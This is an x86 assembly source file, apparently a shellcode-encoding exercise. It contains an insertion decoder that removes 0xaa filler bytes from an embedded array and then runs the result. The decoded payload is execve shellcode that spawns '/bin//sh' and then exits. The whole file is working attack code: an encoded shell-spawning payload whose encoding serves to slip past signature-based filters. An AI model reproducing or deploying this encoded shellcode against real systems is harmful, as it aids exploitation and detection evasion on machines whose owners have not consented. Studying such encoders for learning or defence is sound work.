global _start:

section .data

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    jmp short call_shellcode

decoder:
    pop esi
    lea edi, [esi +1]
    
    mov al, 0x1
  
decode:
    mov bl, [esi + eax]          ; bl : 0xaa / Unless 0xbb has been reached
    xor bl, 0xaa                 ; xor-ing 0xaa with bl, if it doesn't reach 0xbb, result will be 0, and so zero flag[zf] is set
    jnz short EncodedShellcode   ; If zero flag[zf] isn't set, it means that all of the shellcoded has been decoded, and so jump to (decoded)shellcode
    mov bl, byte [esi + eax + 1] ; Example.. 0x31,0xaa,0xc0 / bl = 0xc0
    mov [edi], bl                ; Example.. Before : 0x31, 0xaa, 0xc0 / After : 0x31, 0xc0
    inc edi
    add al, 0x2                  ; Point to next 0xaa
    jmp short decode

call_shellcode:
    call decoder 

    EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x31,0xaa,0xdb,0xaa,0x31,0xaa,0xc9,0xaa,0x31,0xaa,0xd2,0xaa,0xeb,0xaa,0x1d,0xaa,0x8b,0xaa,0x34,0xaa,0x24,0xaa,0xb1,0xaa,0x08,0xaa,0x52,0xaa,0x52,0xaa,0x52,0xaa,0x89,0xaa,0xe7,0xaa,0xf3,0xaa,0xa4,0xaa,0x89,0xaa,0xe3,0xaa,0x52,0xaa,0x53,0xaa,0xb0,0xaa,0x0b,0xaa,0x89,0xaa,0xe1,0xaa,0xcd,0xaa,0x80,0xaa,0x31,0xaa,0xc0,0xaa,0x40,0xaa,0x31,0xaa,0xdb,0xaa,0xcd,0xaa,0x80,0xaa,0xe8,0xaa,0xde,0xaa,0xff,0xaa,0xff,0xaa,0xff,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0xbb,0xbb
